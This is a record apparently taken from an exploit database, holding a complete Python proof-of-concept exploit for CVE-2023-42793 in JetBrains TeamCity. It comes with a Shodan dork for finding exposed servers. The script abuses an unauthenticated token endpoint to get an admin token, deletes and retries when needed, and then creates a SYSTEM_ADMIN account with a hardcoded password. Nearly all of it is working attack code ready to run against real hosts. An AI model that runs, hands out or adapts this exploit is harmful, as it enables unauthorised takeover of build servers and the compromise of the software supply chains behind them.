{"source": "https://www.exploit-db.com/exploits/51884", "vulnName": "JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)", "vulnEDBID": "51884", "vulnCVE": "2023-42793", "author": "BYTEHUNTER", "exploitType": "REMOTE", "platform": "JAVA", "datePublished": "2024-03-14", "vulnContent": "#- Exploit Title: JetBrains TeamCity 2023.05.3 - Remote Code Execution (RCE)\n#- Shodan Dork: http.title:TeamCity , http.favicon.hash:-1944119648\n#- Exploit Author: ByteHunter\n#- Vendor: JetBrains\n#- Email: 0xByteHunter@proton.me\n#- vendor: JetBrains\n#- Version: versions before 2023.05.4\n#- Tested on: 2023.05.3                      \n#- CVE : CVE-2023-42793 \n\nimport requests\nimport argparse\nimport re\nimport random\nimport string\nimport subprocess  \n\n\nbanner = \"\"\"\n=====================================================\n*       CVE-2023-42793                              *\n*  TeamCity Admin Account Creation                  *   \n*                                                   *\n*  Author: ByteHunter                               *\n=====================================================\n\"\"\"\n\nprint(banner)\nparser = argparse.ArgumentParser(description=\"CVE-2023-42793 - TeamCity JetBrains PoC\")\nparser.add_argument(\"-u\", \"--url\", required=True, help=\"Target URL\")\nparser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"verbose mode\")\nargs = parser.parse_args()\n\nurl = args.url\n\nif url.startswith(\"https://\"):\n    curl_command = \"curl -k\"\nelse:\n    curl_command = \"curl\"\n\nget_token_url = f\"{url}/app/rest/users/id:1/tokens/RPC2\"\ndelete_token_url = f\"{url}/app/rest/users/id:1/tokens/RPC2\"\ncreate_user_url = f\"{url}/app/rest/users\"\n\ncreate_user_command = \"\"\ntoken = \"\"\n\nresponse = requests.post(get_token_url, verify=False)\nif response.status_code == 200:\n    match = re.search(r'value=\"([^\"]+)\"', response.text)\n    if match:\n        token = match.group(1)\n        print(f\"Token: {token}\") \n    else:\n        print(\"Token not found in the response\")\n\nelif response.status_code == 404:\n    print(\"Token already exists\")\n    delete_command = f'{curl_command} -X DELETE {delete_token_url}'\n    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    delete_process.wait()\n    delete_output = delete_process.communicate()\n    if delete_process.returncode == 0:\n        print(\"Previous token deleted successfully\\nrun this command again for creating new token & admin user.\")\n    else:\n        print(\"Failed to delete the previous token\")\nelif response.status_code == 400:\n    print(\"Token already exists\")\n    delete_command = f'{curl_command} -X DELETE {delete_token_url}'\n    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    delete_process.wait()\n    delete_output = delete_process.communicate()\n    if delete_process.returncode == 0:\n        print(\"Previous token deleted successfully\\nrun this command again for creating new token & admin user.\")\n    else:\n        print(\"Failed to delete the previous token\")\nelse:\n    print(\"Failed to get a token\")\n\nif token:\n    headers = {\n        \"Authorization\": f\"Bearer {token}\",\n        \"Content-Type\": \"application/json\"\n    }\n    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))\n    username = f\"city_admin{random_chars}\"\n    data = {\n        \"username\": username,\n        \"password\": \"Main_password!!**\",\n        \"email\": \"angry-admin@funnybunny.org\",\n        \"roles\": {\"role\": [{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}]}\n    }\n    create_user_command = f'{curl_command} --path-as-is -H \"Authorization: Bearer {token}\" -X POST {create_user_url} -H \"Content-Type: application/json\" --data \\'{{\"username\": \"{username}\", \"password\": \"theSecretPass!\", \"email\": \"nest@nest\", \"roles\": {{\"role\": [{{\"roleId\": \"SYSTEM_ADMIN\", \"scope\": \"g\"}}]}}}}\\''\n    create_user_response = requests.post(create_user_url, headers=headers, json=data)\n    if create_user_response.status_code == 200:\n        print(\"Successfully exploited!\")\n        print(f\"URL: {url}\")\n        print(f\"Username: {username}\")\n        print(\"Password: Main_password!!**\")\n    else:\n        print(\"Failed to create new admin user\")\n\nif args.verbose:\n    if response.status_code == 400:\n        pass\n    else:\n        print(f\"Final curl command: {create_user_command}\")\n            "}